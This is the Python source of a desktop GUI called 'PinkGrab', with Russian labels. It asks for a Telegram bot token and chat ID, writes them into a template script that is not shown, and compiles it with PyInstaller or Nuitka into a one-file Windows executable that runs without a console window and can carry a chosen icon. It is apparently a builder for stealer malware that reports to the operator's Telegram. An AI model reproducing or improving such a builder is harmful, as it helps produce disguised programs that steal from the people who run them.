import customtkinter as ctk
import os
import shutil
import tkinter.messagebox as messagebox
import tkinter.filedialog as filedialog
import subprocess
from PIL import Image, ImageTk
import threading

icon_path = ''
save_directory = ''

def select_file_path(label, var, dialog_func, dialog_args, text_if_none, text_prefix):
    path = dialog_func(**dialog_args)
    if path:
        var.set(path)
        label.configure(text=f"{text_prefix} {os.path.basename(path) if 'askopen' in dialog_func.__name__ else path}")
    else:
        label.configure(text=text_if_none)

def select_icon():
    select_file_path(icon_label, icon_path_var, filedialog.askopenfilename, 
                     {"filetypes": [("Icon files", "*.ico")]}, "Иконка не выбрана", "Иконка выбрана:")

def select_directory():
    select_file_path(directory_label, directory_var, filedialog.askdirectory, 
                     {}, "Директория не выбрана", "Директория выбрана:")

def create_file():
    def compilation_task():
        bot_token, chat_id, compiler = bot_token_var.get(), chat_id_var.get(), compiler_var.get()
        source_file = os.path.join('data', 'example.py')
        destination_file = os.path.join(save_directory or 'compile', 'compiled.py')

        os.makedirs(os.path.dirname(destination_file), exist_ok=True)
        shutil.copyfile(source_file, destination_file)

        with open(destination_file, 'r+', encoding='utf-8') as file:
            filedata = file.read().replace('CHAT_ID_EXAMPLE', chat_id).replace('BOT_TOKEN_EXAMPLE', bot_token)
            file.seek(0); file.write(filedata); file.truncate()

        command = (['pyinstaller', '--onefile', '--noconsole'] if compiler == "pyinstaller" 
                   else ['nuitka', '--onefile', '--windows-disable-console'])
        if icon_path_var.get(): command.append(f'--icon={icon_path_var.get()}' if compiler == "pyinstaller" else f'--windows-icon-from-ico={icon_path_var.get()}')
        command.append('compiled.py')

        try:
            subprocess.run(command, check=True, cwd=os.path.dirname(destination_file))
            messagebox.showinfo("Успех", "Компиляция завершена успешно!")
        except subprocess.CalledProcessError as e:
            messagebox.showerror("Ошибка компиляции", f"Произошла ошибка:\n{e}")

    threading.Thread(target=compilation_task).start()

def resize_background(event):
    bg_image = Image.open('resources/main.png').resize((event.width, event.height), Image.LANCZOS)
    photo = ImageTk.PhotoImage(bg_image)
    image_label.configure(image=photo)
    image_label.image = photo

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

app = ctk.CTk()
app.geometry("800x480")
app.title("PinkGrab \\ by  @Dedulin && @RigOlit")

bg_image = Image.open('resources/main.png').resize((800, 480))
photo = ImageTk.PhotoImage(bg_image)

icon_path_var, directory_var = ctk.StringVar(), ctk.StringVar()
bot_token_var, chat_id_var, compiler_var = ctk.StringVar(), ctk.StringVar(), ctk.StringVar(value="nuitka")

image_label = ctk.CTkLabel(app, image=photo)
image_label.place(x=0, y=0, relwidth=1, relheight=1)
app.bind("<Configure>", resize_background)

frame = ctk.CTkFrame(app, width=400, height=400, corner_radius=10)
frame.place(relx=0.5, rely=0.5, anchor=ctk.CENTER)

def create_label_entry(label_text, variable, font=("Arial", 14), entry_width=300):
    ctk.CTkLabel(frame, text=label_text, font=font, text_color="white").pack(pady=(10, 5))
    return ctk.CTkEntry(frame, textvariable=variable, width=entry_width, font=font, text_color="white").pack(pady=(0, 10))

create_label_entry("Введите бот токен", bot_token_var)
create_label_entry("Введите чат айди", chat_id_var)

ctk.CTkLabel(frame, text="Выберите компилятор", font=("Arial", 14), text_color="white").pack(pady=(10, 5))
ctk.CTkOptionMenu(frame, variable=compiler_var, values=["nuitka", "pyinstaller"], font=("Arial", 14), text_color="white",
                  fg_color="#FF69B4", button_color="#FF69B4", button_hover_color="#FF1493").pack(pady=(0, 10))

icon_label = ctk.CTkLabel(frame, text="Иконка не выбрана", font=("Arial", 14), text_color="#FF69B4")
icon_label.pack(pady=(10, 5))
ctk.CTkButton(frame, text="Выбрать иконку", command=select_icon, font=("Arial", 14), text_color="white",
              fg_color="#FF69B4", hover_color="#FF1493").pack(pady=(0, 10))

directory_label = ctk.CTkLabel(frame, text="Директория не выбрана", font=("Arial", 14), text_color="#FF69B4")
directory_label.pack(pady=(10, 5))
ctk.CTkButton(frame, text="Выбрать директорию", command=select_directory, font=("Arial", 14), text_color="white",
              fg_color="#FF69B4", hover_color="#FF1493").pack(pady=(0, 10))

ctk.CTkButton(frame, text="Создать файл", command=create_file, font=("Arial", 14), text_color="white",
              fg_color="#FF69B4", hover_color="#FF1493").pack(pady=20)

app.mainloop()
